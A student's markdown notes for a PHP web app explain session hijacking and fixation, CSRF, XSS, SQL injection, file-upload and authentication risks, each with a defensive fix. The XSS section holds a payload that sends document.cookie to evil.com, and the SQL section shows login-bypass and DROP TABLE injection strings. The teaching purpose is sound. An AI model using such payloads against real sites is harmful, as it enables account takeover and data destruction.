# Task 6 - Security Notes

the core idea behind everything here is pretty simple: **anything that comes from outside your application is guilty until proven innocent.** URLs, form fields, uploaded files, cookies, none of it gets trusted automatically. once that clicks, most of the stuff below stops feeling like arbitrary rules and starts feeling obvious.

---

one thing that surprised me is how many successful attacks never touch the code at all. attackers go after people first because it's just easier.

a fake login page that looks identical to the real one. a casual email asking someone to "verify their account". or just checking someone's public instagram to answer their security question ("what's your dog's name?"). none of these need any hacking skill, they work constantly because people aren't on guard for them.

the practical side of this: turn on two-factor authentication everywhere you can, and teach users to check the URL bar before typing a password. shred printed documents. none of that requires a single line of PHP.

---

## Session Vulnerabilities

a session is how the server remembers you between requests. after you log in, the server creates a session and hands you an ID (stored in a cookie). every request you make after that includes this ID, and the server uses it to know who you are.

the problem is obvious once you see it: **if someone gets your session ID, they don't need your password.** they just use the ID directly.

### Types of session attacks

**Session Hijacking**, someone steals your session ID and impersonates you. this can happen over unencrypted connections, through XSS (more on that later), or by physically getting access to your browser.

**Session Fixation**, a slightly sneakier one. instead of stealing your ID after login, the attacker tricks you into using an ID they already chose before you even log in. they know the ID, so once you authenticate with it they have full access.

### How to Fix

the main countermeasure for fixation is right here in `Core/Authenticator.php`:

```php
public function login($user)
{
    $_SESSION['user'] = [
        'email' => $user['email']
    ];

    session_regenerate_id(true);
}
```

`session_regenerate_id(true)` replaces the session ID with a brand new one the moment the user logs in. even if an attacker planted an ID beforehand, it gets thrown away at this point.

the rest of it comes down to:

- use HTTPS so session IDs can't be intercepted in transit
- set cookies as `HttpOnly` (javascript can't read them) and `Secure` (only sent over HTTPS)
- add a session timeout so idle sessions don't live forever

---

## CSRF

**Cross-Site Request Forgery** is when an attacker tricks your browser into making a request to a site you're already logged into, without you knowing.

say you're logged into your bank. you open another tab and visit a random site. that site has a hidden form that submits a transfer request to your bank's URL. your browser dutifully includes your session cookie with that request. the bank sees a valid session and processes it.

you didn't click anything. you didn't know it happened. but the request looked legitimate to the server because the session was real.

### Solution: CSRF tokens

every form gets a unique random token that's also stored server-side:

```html
<form method="POST" action="/transfer">
    <input type="hidden" name="_token" value="<?= $csrfToken ?>">
    ...
</form>
```

before processing any POST request, the server checks that the token in the form matches the one it has on file. the attacker's site has no way to know what that token is, so the forged request gets rejected.

if the token is missing or wrong → request is dead.

---

## XSS

**Cross-Site Scripting** is when an attacker gets their JavaScript to run inside your page. usually this happens because the app takes user input and prints it directly to the page without escaping it.

the classic example:

```html
<!-- what the app does -->
<p>Welcome, <?= $username ?></p>

<!-- attacker sets their username to: -->
<script>document.location='https://evil.com/?c='+document.cookie</script>
```

now every time someone loads the page with that username, the script runs and ships their cookies to the attacker's server.

### Types of XSS

**Stored XSS**: the payload is saved in the database and executes every time someone views that content. the worst kind because it affects all users, not just the one who got tricked.

**Reflected XSS**: the payload lives in the URL and gets echoed back in the response. usually needs the victim to click a crafted link.

### Risks

- stealing session cookies (then using them for session hijacking)
- performing actions on behalf of the user
- injecting fake login forms to capture credentials

### How To Fix

```php
// vulnerable
echo $_POST['comment'];

// safe
echo htmlspecialchars($_POST['comment']);
```

`htmlspecialchars()` converts characters like `<`, `>`, and `"` into their HTML entity equivalents (`&lt;`, `&gt;`, etc.) so the browser renders them as text instead of executing them as markup or script.

the rule is simple: anything you print to the page that came from user input goes through `htmlspecialchars()` first.

---

## SQL Injection

SQL injection is when an attacker embeds SQL into an input field to mess with the query the app builds.

the textbook example:

```php
// the app runs this
$query = "SELECT * FROM users WHERE email = '$email'";
```

normal input: `user@example.com` → works fine.

attacker input: `' OR 1=1 --`

the query becomes:

```sql
SELECT * FROM users WHERE email = '' OR 1=1 --'
```

`1=1` is always true, the `--` comments out the rest. the query returns every user in the table. login bypassed.

a more destructive input could be `'; DROP TABLE users; --` and now your user table is gone.

### the fix: prepared statements

we already went through this in task 2 and task 4, user input should never be concatenated into a SQL string. it always goes into the params array:

```php
// vulnerable
$db->query("SELECT * FROM users WHERE email = '$email'");

// safe
$db->query('SELECT * FROM users WHERE email = :email', ['email' => $email])->find();
```

the query template and the values are sent to the database as two separate things. by the time the value arrives, the query structure is already locked. there's nothing left to inject into.

---

## File Upload Vulnerabilities

file uploads are a big attack surface if you're not careful. the obvious risk: someone uploads a `.php` file instead of an image, then visits its URL and it executes on your server. game over.

but even "image" files aren't safe if you only check the extension. an attacker can rename `shell.php` to `shell.jpg` and sometimes that's enough to get it through naive checks.

### How to Fix

a few layers:

- **check MIME type** using `finfo_file()`, not just the file extension
- **rename the file** on upload, strip the original name, generate something random like a UUID + the allowed extension
- **store outside the web root** so even if something slips through, it can't be executed via URL
- **strip embedded code** from images by re-processing them through GD or ImageMagick, rewriting the pixels destroys any PHP that was hidden in the file metadata

---

## Authentication Issues

this is mostly about storing passwords correctly and not making login too easy to brute force.

the bad patterns:

- storing passwords as plain text (if your database leaks, everyone's password is exposed)
- no limit on login attempts (attacker can just try thousands of passwords)

the correct pattern, which we already have from task 4:

```php
// storing a new password
$hashed = password_hash($password, PASSWORD_BCRYPT);

// checking a login attempt
if (password_verify($inputPassword, $storedHash)) {
    // log them in
}
```

`password_hash()` doesn't just hash the password, it salts it automatically, which means two identical passwords produce different hashes. even if someone gets the hash, they can't use a precomputed lookup table to crack it.

`password_verify()` handles the comparison correctly. don't try to do this manually.

for brute force: track failed attempts per IP or per account, and lock out or add delays after a threshold is hit.

---

## Validation vs Sanitization

these are related but different things that often get confused:

**Validation** is checking whether the data is acceptable, is this a valid email format? is this number within the expected range? is this field non-empty? it answers the question: *should we accept this?*

**Sanitization** is cleaning the data, stripping HTML tags, trimming whitespace, escaping special characters. it answers the question: *how do we make this safe to use?*

we already built both into the Validator class in task 2. the important thing is doing both, validating alone doesn't protect you when you go to output the data, and sanitizing alone doesn't protect you if the data is structurally wrong to begin with.

---

## Conclusion

there are four attack types worth knowing well because they show up constantly:

- **XSS**: escape everything you print. `htmlspecialchars()`.
- **SQL Injection**: prepared statements, always. never concatenate user input into queries.
- **CSRF**: tokens in forms. check them before processing.
- **Session attacks**: HTTPS, `session_regenerate_id()` on login, `HttpOnly` + `Secure` cookies.